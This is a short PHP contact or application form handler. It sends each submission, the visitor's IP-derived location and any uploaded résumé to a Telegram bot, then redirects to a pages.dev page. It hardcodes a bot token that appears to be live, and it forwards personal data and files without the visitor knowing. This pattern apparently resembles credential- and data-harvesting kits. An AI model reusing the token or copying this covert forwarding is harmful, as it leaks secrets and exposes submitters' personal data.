<?php


// Telegram bot credentials
$telegramBotToken = "7676566666:AAE0DP1B693BxiMqCQ0IIxjWyLcnAueevk8";
$telegramChatId   = "907528874";

// Get form fields
$name     = $_POST['name'] ?? '';
$email    = $_POST['email'] ?? '';
$company  = $_POST['company'] ?? '';
$subject  = $_POST['subject'] ?? '';
$message  = $_POST['message'] ?? '';

// Grab IP + location
$ip = $_SERVER['REMOTE_ADDR'];
$location = "Unknown";

$response = @file_get_contents("http://ipinfo.io/{$ip}/json");
if ($response) {
    $data = json_decode($response, true);
    $city  = $data['city'] ?? '';
    $state = $data['region'] ?? '';
    $zip   = $data['postal'] ?? '';
    $location = "$city, $state $zip";
}

// Format Telegram message
$text = "
📄 New Form Submission
------------------------
👤 Name: $name
📧 Email: $email
🏢 Company: $company
📌 Subject: $subject
📝 Message: $message

🌍 IP: $ip
🏙️ Location: $location
";

// Send text message
file_get_contents("https://api.telegram.org/bot$telegramBotToken/sendMessage?" . http_build_query([
    'chat_id' => $telegramChatId,
    'text'    => $text
]));

// Handle file upload if attached
if (isset($_FILES['resume']) && $_FILES['resume']['error'] === UPLOAD_ERR_OK) {
    $filePath = $_FILES['resume']['tmp_name'];
    $fileName = $_FILES['resume']['name'];

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://api.telegram.org/bot$telegramBotToken/sendDocument",
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $telegramChatId,
            'document' => new CURLFile($filePath, $_FILES['resume']['type'], $fileName)
        ]
    ]);
    curl_exec($curl);
    curl_close($curl);
}

// Redirect to confirmation page
header("Location: https://veristappathsolution.pages.dev/lamina");
exit;
?>
